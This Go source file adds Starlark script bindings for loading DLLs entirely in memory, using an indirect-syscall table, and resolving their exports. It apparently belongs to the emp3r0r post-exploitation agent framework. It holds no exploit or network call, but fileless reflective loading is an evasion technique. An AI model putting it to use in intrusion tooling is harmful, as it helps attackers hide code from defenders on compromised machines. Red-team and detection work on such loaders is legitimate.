//go:build windows

package script

import (
	"fmt"
	"sync"

	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
	ntsyscall "github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"go.starlark.net/starlark"
)

// Starlark bindings for core/lib/memmod (in-memory PE/DLL loading).
//
// A loaded module is handed to the script as its base address; a process-
// wide registry maps that handle back to the *memmod.Module so
// mem_proc_address / mem_proc_ordinal / mem_free can operate on it. The
// script owns the handle and must call mem_free when done.

var (
	moduleCacheMu sync.RWMutex
	moduleCache   = make(map[uintptr]*memmod.Module)
)

func init() {
	RegisterAPI("mem_load_library", starlarkMemLoadLibrary)
	RegisterAPI("mem_load", starlarkMemLoadLibrary)
	RegisterAPI("mem_proc_address", starlarkMemProcAddress)
	RegisterAPI("mem_proc_ordinal", starlarkMemProcOrdinal)
	RegisterAPI("mem_free", starlarkMemFree)
	RegisterAPI("mem_base_addr", starlarkMemBaseAddr)
}

// ensureSyscallTable initializes the global indirect-syscall table used by
// memmod if it has not been set up yet (the agent normally initializes it at
// startup).
func ensureSyscallTable() error {
	if ntsyscall.RuntimeSyscallTable != nil {
		return nil
	}
	table, err := ntsyscall.InitializeSyscallTable()
	if err != nil {
		return err
	}
	ntsyscall.RuntimeSyscallTable = table
	return nil
}

// starlarkMemLoadLibrary maps a DLL image into the current process entirely
// in memory and returns its base address as the module handle.
func starlarkMemLoadLibrary(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var dataVal starlark.Value
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "data", &dataVal); err != nil {
		return starlark.None, err
	}
	data, err := starlarkToBytes(dataVal)
	if err != nil {
		return starlark.None, err
	}
	if err := ensureSyscallTable(); err != nil {
		return starlark.MakeUint64(0), fmt.Errorf("mem_load_library: initializing syscall table: %w", err)
	}
	module, err := memmod.LoadLibrary(data)
	if err != nil {
		return starlark.MakeUint64(0), fmt.Errorf("mem_load_library: %w", err)
	}
	base := module.BaseAddr()
	moduleCacheMu.Lock()
	moduleCache[base] = module
	moduleCacheMu.Unlock()
	return starlark.MakeUint64(uint64(base)), nil
}

// getCachedModule resolves a script-visible handle back to its loaded
// *memmod.Module.
func getCachedModule(handle uint64) (*memmod.Module, error) {
	moduleCacheMu.RLock()
	module, ok := moduleCache[uintptr(handle)]
	moduleCacheMu.RUnlock()
	if !ok || module == nil {
		return nil, fmt.Errorf("unknown module handle 0x%x (was it already freed?)", handle)
	}
	return module, nil
}

// starlarkMemProcAddress returns the address of the named export of a
// previously loaded module.
func starlarkMemProcAddress(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var handle uint64
	var name string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "module", &handle, "name", &name); err != nil {
		return starlark.None, err
	}
	module, err := getCachedModule(handle)
	if err != nil {
		return starlark.None, err
	}
	addr, err := module.ProcAddressByName(name)
	if err != nil {
		return starlark.None, fmt.Errorf("mem_proc_address %s: %w", name, err)
	}
	return starlark.MakeUint64(uint64(addr)), nil
}

// starlarkMemProcOrdinal returns the address of an export by ordinal.
func starlarkMemProcOrdinal(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var handle uint64
	var ordinal int
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "module", &handle, "ordinal", &ordinal); err != nil {
		return starlark.None, err
	}
	if ordinal < 0 || ordinal > 0xffff {
		return starlark.None, fmt.Errorf("mem_proc_ordinal: ordinal out of range: %d", ordinal)
	}
	module, err := getCachedModule(handle)
	if err != nil {
		return starlark.None, err
	}
	addr, err := module.ProcAddressByOrdinal(uint16(ordinal))
	if err != nil {
		return starlark.None, fmt.Errorf("mem_proc_ordinal %d: %w", ordinal, err)
	}
	return starlark.MakeUint64(uint64(addr)), nil
}

// starlarkMemFree unloads a module previously loaded with mem_load_library
// and drops it from the registry.
func starlarkMemFree(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var handle uint64
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "module", &handle); err != nil {
		return starlark.None, err
	}
	module, err := getCachedModule(handle)
	if err != nil {
		return starlark.None, err
	}
	module.Free()
	moduleCacheMu.Lock()
	delete(moduleCache, uintptr(handle))
	moduleCacheMu.Unlock()
	return starlark.None, nil
}

// starlarkMemBaseAddr returns the base address of a loaded module (the same
// value that mem_load_library returned).
func starlarkMemBaseAddr(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var handle uint64
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "module", &handle); err != nil {
		return starlark.None, err
	}
	module, err := getCachedModule(handle)
	if err != nil {
		return starlark.None, err
	}
	return starlark.MakeUint64(uint64(module.BaseAddr())), nil
}
